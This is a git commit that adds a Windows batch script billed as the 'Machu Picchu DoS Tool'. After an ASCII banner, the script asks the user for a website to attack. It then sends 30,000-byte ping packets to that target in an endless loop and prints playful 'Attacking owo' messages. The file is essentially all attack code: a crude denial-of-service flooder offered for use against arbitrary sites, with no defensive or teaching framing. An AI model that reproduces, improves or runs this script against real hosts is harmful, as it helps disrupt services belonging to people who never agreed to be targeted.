f50920575ff889e68eb3ba117d34f9251173cf48
Br3adBo1 <84653552+Br3adBo1@users.noreply.github.com>
2021-06-01 12:01:33 -0500

    Create machupicchu.bat

---
+++ machupicchu.bat
@@ -0,0 +1,33 @@
+@echo off
+title MACHU PICCHU IS HERE!
+color 09
+echo.
+echo.
+ECHO    ..........................................
+echo   ............................................
+echo           -- Machu Picchu DoS Tool --
+echo           //   Made By Bread Boi   //
+echo   ............................................
+echo    ..........................................
+echo                      .
+echo                     . . 
+echo                      .
+echo                     . .
+echo                      . 
+echo   In the alphabet, what letter follows after A?
+echo.
+echo.
+pause >nul
+:fnc0
+cls
+echo          . -      Machu Picchu Is Here      - . 
+echo           . -      Machu Picchu Is Here      - .  
+echo            . -      Machu Picchu Is Here      - .   
+echo             . -      Machu Picchu Is Here      - .
+echo.
+echo.
+set /p objdos=Enter the website you want to attack : 
+:bucle
+ping -l 30000 -n 1 -w 75 %objdos% >nul
+echo Performing the attack 7w7 : %objdos% - Attacking owo ...
+goto bucle
